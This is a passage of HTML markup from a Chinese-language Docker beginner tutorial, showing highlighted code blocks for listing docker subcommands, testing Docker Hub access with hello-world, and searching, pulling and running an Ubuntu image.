class=\"crayon-e\">image </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">repository </span><span class=\"crayon-i\">from</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">registry</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca59e76779350272-25\"><span class=\"crayon-e\">push  </span><span class=\"crayon-e\">Push </span><span class=\"crayon-e\">an </span><span class=\"crayon-e\">image </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">repository </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">registry</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e76779350272-26\"><span class=\"crayon-e\">rename  </span><span class=\"crayon-i\">Rename</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">container</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca59e76779350272-27\"><span class=\"crayon-e\">restart  </span><span class=\"crayon-i\">Restart</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">container</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e76779350272-28\"><span class=\"crayon-e\">rm  </span><span class=\"crayon-e\">Remove </span><span class=\"crayon-e\">one </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">more </span><span class=\"crayon-e\">containers</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca59e76779350272-29\"><span class=\"crayon-e\">rmi  </span><span class=\"crayon-e\">Remove </span><span class=\"crayon-e\">one </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">more </span><span class=\"crayon-e\">images</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e76779350272-30\"><span class=\"crayon-e\">run  </span><span class=\"crayon-i\">Run</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">command </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">container</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca59e76779350272-31\"><span class=\"crayon-e\">save  </span><span class=\"crayon-e\">Save </span><span class=\"crayon-e\">one </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">more </span><span class=\"crayon-e\">images </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tar </span><span class=\"crayon-e\">archive</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e76779350272-32\"><span class=\"crayon-e\">search  </span><span class=\"crayon-e\">Search </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">Docker </span><span class=\"crayon-e\">Hub </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">images</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca59e76779350272-33\"><span class=\"crayon-e\">start  </span><span class=\"crayon-e\">Start </span><span class=\"crayon-e\">one </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">more </span><span class=\"crayon-e\">stopped </span><span class=\"crayon-e\">containers</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e76779350272-34\"><span class=\"crayon-e\">stats  </span><span class=\"crayon-i\">Display</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">live </span><span class=\"crayon-e\">stream </span><span class=\"crayon-e\">of </span><span class=\"crayon-e\">container</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">s</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">resource </span><span class=\"crayon-e\">usage </span><span class=\"crayon-e\">statistics</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca59e76779350272-35\"><span class=\"crayon-e\">stop  </span><span class=\"crayon-i\">Stop</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">running </span><span class=\"crayon-e\">container</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e76779350272-36\"><span class=\"crayon-e\">tag  </span><span class=\"crayon-e\">Tag </span><span class=\"crayon-e\">an </span><span class=\"crayon-e\">image </span><span class=\"crayon-i\">into</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">repository</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca59e76779350272-37\"><span class=\"crayon-e\">top  </span><span class=\"crayon-e\">Display </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">running </span><span class=\"crayon-e\">processes </span><span class=\"crayon-i\">of</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">container</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e76779350272-38\"><span class=\"crayon-e\">unpause  </span><span class=\"crayon-e\">Unpause </span><span class=\"crayon-e\">all </span><span class=\"crayon-e\">processes </span><span class=\"crayon-i\">within</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">container</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca59e76779350272-39\"><span class=\"crayon-e\">update  </span><span class=\"crayon-e\">Update </span><span class=\"crayon-e\">configuration </span><span class=\"crayon-e\">of </span><span class=\"crayon-e\">one </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">more </span><span class=\"crayon-e\">containers</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e76779350272-40\"><span class=\"crayon-e\">version  </span><span class=\"crayon-e\">Show </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">Docker </span><span class=\"crayon-e\">version </span><span class=\"crayon-e\">information</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca59e76779350272-41\"><span class=\"crayon-e\">volume  </span><span class=\"crayon-e\">Manage </span><span class=\"crayon-e\">Docker </span><span class=\"crayon-e\">volumes</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e76779350272-42\"><span class=\"crayon-e\">wait  </span><span class=\"crayon-e\">Block </span><span class=\"crayon-i\">until</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">container </span><span class=\"crayon-v\">stops</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">then</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">print </span><span class=\"crayon-e\">its </span><span class=\"crayon-e\">exit </span><span class=\"crayon-i\">code</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca59e76779350272-43\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0090 seconds] -->\r\n<p>要进一步查看某个命令支持的选项，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca59e7a769503908\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ docker docker-subcommand info\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e7a769503908-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e7a769503908-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca59e7a769503908-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">docker </span><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">subcommand </span><span class=\"crayon-i\">info</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e7a769503908-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>就会列出 docker 子命令所支持的选项了。</p>\n<h3 id=\"toc_2\">测试与 Docker Hub 的连接</h3>\n<p>默认，所有镜像都是从 Docker Hub 中拉取下来的。我们可以从 Docker Hub 上传或下载操作系统镜像。为了检查我们是否能够正常地通过 Docker Hub 上传/下载镜像，运行</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca59e7e242224751\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ docker run hello-world\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e7e242224751-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e7e242224751-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca59e7e242224751-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">docker </span><span class=\"crayon-e\">run </span><span class=\"crayon-v\">hello</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">world</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e7e242224751-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>结果应该是：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca59e81433491951\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nHello from Docker.\r\nThis message shows that your installation appears to be working correctly.\r\n…\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e81433491951-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e81433491951-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e81433491951-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e81433491951-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca59e81433491951-1\"><span class=\"crayon-e\">Hello </span><span class=\"crayon-e\">from </span><span class=\"crayon-v\">Docker</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e81433491951-2\"><span class=\"crayon-r\">This</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">message </span><span class=\"crayon-e\">shows </span><span class=\"crayon-e\">that </span><span class=\"crayon-e\">your </span><span class=\"crayon-e\">installation </span><span class=\"crayon-e\">appears </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">be </span><span class=\"crayon-e\">working </span><span class=\"crayon-v\">correctly</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca59e81433491951-3\">…</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e81433491951-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>输出结果表示你可以访问 Docker Hub 而且也能从 Docker Hub 下载 docker 镜像。</p>\n<h3 id=\"toc_3\">搜索镜像</h3>\n<p>搜索容器的镜像，运行</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca59e84983158184\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ docker search Ubuntu\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e84983158184-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e84983158184-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca59e84983158184-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">docker </span><span class=\"crayon-e\">search </span><span class=\"crayon-i\">Ubuntu</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e84983158184-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>我们应该会得到可用的 Ubuntu 镜像的列表。记住，如果你想要的是官方的镜像，请检查 <code>official</code> 这一列上是否为 <code>[OK]</code>。</p>\n<h3 id=\"toc_4\">下载镜像</h3>\n<p>一旦搜索并找到了我们想要的镜像，我们可以运行下面语句来下载它：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca59e88792977925\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ docker pull Ubuntu\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e88792977925-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e88792977925-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca59e88792977925-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">docker </span><span class=\"crayon-e\">pull </span><span class=\"crayon-i\">Ubuntu</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e88792977925-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>要查看所有已下载的镜像，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca59e8b644128635\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ docker images\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca59e8b644128635-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca59e8b644128635-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca59e8b644128635-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">docker </span><span class=\"crayon-i\">images</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca59e8b644128635-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3 id=\"toc_5\">运行容器</h3>\n<p>使用已下载镜像来运行容器，使用下面命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca59e8e606919295\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ docker run -it Ubuntu\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" 